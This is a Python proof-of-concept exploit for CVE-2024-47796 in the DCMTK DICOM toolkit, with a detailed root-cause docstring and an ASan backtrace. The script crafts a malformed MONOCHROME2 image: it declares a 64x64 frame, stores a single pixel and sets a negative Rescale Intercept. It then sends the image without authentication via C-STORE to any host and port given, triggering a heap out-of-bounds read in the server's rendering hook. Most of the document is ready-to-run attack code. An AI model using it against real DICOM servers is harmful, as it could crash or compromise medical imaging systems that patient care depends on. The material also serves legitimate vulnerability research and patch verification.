#!/usr/bin/env python3
"""
PoC for DCMTK CVE-2024-47796 (Cisco Talos TALOS-2024-2122) -- improper array
index validation in the "nowindow" grayscale rendering path (CWE-125/787 OOB),
reached server-side by a single C-STORE-RQ carrying a crafted MONOCHROME2 image
whose declared frame geometry (Rows*Columns) exceeds the supplied Pixel Data and
whose negative Rescale Intercept drives the no-window LUT origin out of bounds.

VERIFIED crash (real DCMTK 3.6.8 + ASan, server side, deterministic 3/3) -- the
backtrace matches the Talos report frame-for-frame:
    ==ERROR: AddressSanitizer: heap-buffer-overflow ... READ of size 1
      #0 DiMonoOutputPixelTemplate<short,int,unsigned char>::nowindow()  dimoopxt.h:748
      #1 DiMonoOutputPixelTemplate constructor                          dimoopxt.h:125
      #2 DiMonoImage::getDataSint16()                                   dimoimg4.cc:77
      #3 DiMonoImage::getData()                                         dimoimg.cc:1515
      #4 DiMono2Image::getOutputData()                                  dimo2img.cc:141
      #5 DicomImage::getOutputData()                                    dcmimage.h:427
      #6 DVPresentationState::getPixelData()                            dvpstat.cc:1836
      #7 main                                                           dcmp2pgm.cc:531
    SUMMARY: AddressSanitizer: heap-buffer-overflow dimoopxt.h:748 in
      DiMonoOutputPixelTemplate<...>::nowindow()

Root cause (fixed in commit 89a6e399f1, DCMTK-3.6.9):
  dcmimgle/include/dcmtk/dcmimgle/dimoopxt.h, nowindow() no-VOI-window branch:
      const T3 *lut0 = lut - OFstatic_cast(T2, inter->getAbsMinimum());   // origin
      q = Data;
      for (i = Count; i != 0; --i)
          *(q++) = *(lut0 + (*(p++)));            // dimoopxt.h:748  <-- OOB read
  The no-window optimization LUT `lut` has `ocnt = getAbsMaxRange()` entries.
  `lut0 = lut - getAbsMinimum()` is the "zero" entry; the render then indexes
  `lut0 + *p` for every intermediate pixel `*p`. A NEGATIVE Rescale Intercept
  (here -1000) makes the modality-transformed intermediate minimum
  (getAbsMinimum()) strongly negative, so `lut0 = lut + 1000...` is pushed far
  past the small `ocnt`-entry lut, and `lut0 + *p` reads off the end of the lut
  heap allocation -> ASan heap-buffer-overflow. There is no bounds check on the
  LUT index. The companion lever is the geometry mismatch (Rows*Columns >> stored
  pixels) which the fix (commit 89a6e399, dimoipxt.h) also hardens by filling the
  unpopulated frame tail with getAbsMinimum() instead of zero. nowindow() is the
  NO-WINDOW branch: taken when rendering a grayscale frame with no VOI window /
  VOI LUT, which dcmp2pgm's default presentation state does.

Minimal deterministic trigger geometry (isolated empirically, crashes 3/3):
  * BitsAllocated 16, BitsStored 8, HighBit 15, PixelRepresentation 0
    -> internal representation is 8-bit (T3 = Uint8), input is 16-bit (T1 short),
    so DCMTK does NOT re-use the input buffer and the small Uint8 optimization
    LUT is built -- this <short,int,unsigned char> instantiation is the one the
    Talos report crashed.
  * Rows=64, Columns=64 (FrameSize/Count = 4096) but only ONE 16-bit pixel is
    actually stored in (7FE0,0010) Pixel Data.
  * RescaleSlope=1, RescaleIntercept=-1000  -> negative modality minimum ->
    lut0 origin pushed below the lut buffer -> OOB read at dimoopxt.h:748.
  * MONOCHROME2, no WindowCenter/WindowWidth -> the no-window path.

Reachability over the DICOM network (pre-auth): one A-ASSOCIATE + one C-STORE-RQ
proposing CT Image Storage over Explicit VR LE. storescp accepts the context and
stores the object; its --exec-on-reception hook runs dcmp2pgm on the received
file, which loads the image into a DEFAULT DVPresentationState and renders it
without a VOI window -> nowindow() -> the crash. This is exactly the "DICOM file
processing / DICOM-to-image conversion" vector named in the advisory, fed by the
inbound C-STORE. (The simpler dcm2pnm clamps the processed pixel count and does
NOT crash; dcmp2pgm's presentation-state geometry path is the Talos crash path.)

Usage: poc_nowindow_2024-47796.py <host> <port>
"""
import struct
import sys

from pydicom.dataset import Dataset, FileMetaDataset
from pydicom.uid import (
    CTImageStorage,
    ExplicitVRLittleEndian,
    ImplicitVRLittleEndian,
    generate_uid,
)
from pynetdicom import AE
from pynetdicom.presentation import build_context


def build_dataset():
    ds = Dataset()
    ds.file_meta = FileMetaDataset()
    ds.file_meta.MediaStorageSOPClassUID = CTImageStorage
    ds.file_meta.MediaStorageSOPInstanceUID = generate_uid()
    ds.file_meta.TransferSyntaxUID = ExplicitVRLittleEndian

    ds.SOPClassUID = CTImageStorage
    ds.SOPInstanceUID = ds.file_meta.MediaStorageSOPInstanceUID
    ds.PatientName = "NoWindow^Overflow"
    ds.PatientID = "CVE-2024-47796"

    # dcmp2pgm loads the object into a default DVPresentationState; createFromImage()
    # requires a structurally valid image (Study/Series UIDs, Modality, identifiers)
    # or it bails with "invalid data structures" BEFORE rendering. None of these
    # changes the OOB geometry.
    ds.StudyInstanceUID = generate_uid()
    ds.SeriesInstanceUID = generate_uid()
    ds.StudyID = "1"
    ds.SeriesNumber = "1"
    ds.InstanceNumber = "1"
    ds.Modality = "CT"
    ds.PatientBirthDate = ""
    ds.PatientSex = ""
    ds.StudyDate = ""
    ds.StudyTime = ""
    ds.AccessionNumber = ""
    ds.ReferringPhysicianName = ""

    # 16-bit allocated, 8-bit stored -> internal Uint8 representation (T3),
    # 16-bit input (T1): different sizes, so the small optimization LUT is built.
    ds.SamplesPerPixel = 1
    ds.PhotometricInterpretation = "MONOCHROME2"
    ds.BitsAllocated = 16
    ds.BitsStored = 8
    ds.HighBit = 15
    ds.PixelRepresentation = 0

    # Declared frame: 64*64 = 4096 pixels (Count); only ONE pixel is stored.
    ds.Rows = 64
    ds.Columns = 64

    # Negative Rescale Intercept -> negative modality minimum -> lut0 origin
    # (lut - getAbsMinimum()) pushed past the small lut -> OOB read at line 748.
    ds.RescaleSlope = "1"
    ds.RescaleIntercept = "-1000"
    ds.RescaleType = "HU"

    # Exactly one 16-bit pixel of data (FrameSize is 4096).
    ds.add_new(0x7FE00010, "OW", struct.pack("<H", 0xAAAA))

    ds.is_little_endian = True
    ds.is_implicit_VR = False
    return ds


def main():
    host = sys.argv[1] if len(sys.argv) > 1 else "127.0.0.1"
    port = int(sys.argv[2]) if len(sys.argv) > 2 else 11112
    print(f"[*] Target {host}:{port}  CVE-2024-47796 nowindow heap-buffer-overflow")

    ds = build_dataset()
    ae = AE(ae_title=b"OIDA-POC")
    ae.requested_contexts = [
        build_context(CTImageStorage, ExplicitVRLittleEndian),
        build_context(CTImageStorage, ImplicitVRLittleEndian),
    ]

    assoc = ae.associate(host, port, ae_title=b"ANY-SCP")
    if not assoc.is_established:
        print("[!] association rejected/aborted")
        return
    print("[+] association established (CT Image Storage)")
    print("[*] -> C-STORE-RQ: MONOCHROME2 16/8-bit, 64x64 declared, 1 px stored, "
          "RescaleIntercept=-1000, no VOI window")
    try:
        status = assoc.send_c_store(ds)
        if status:
            print(f"[*] <- C-STORE status 0x{status.Status:04x}")
        else:
            print("[+] no/empty C-STORE response")
    except Exception as e:
        print(f"[+] send_c_store raised ({e})")
    finally:
        try:
            assoc.release()
        except Exception:
            pass
    print("[*] Stored. The server's dcmp2pgm reception hook now renders the mono "
          "pixel data WITHOUT a VOI window.")
    print("[*] Check `docker logs` for ASan heap-buffer-overflow in "
          "DiMonoOutputPixelTemplate::nowindow / dimoopxt.h:748.")


if __name__ == "__main__":
    main()
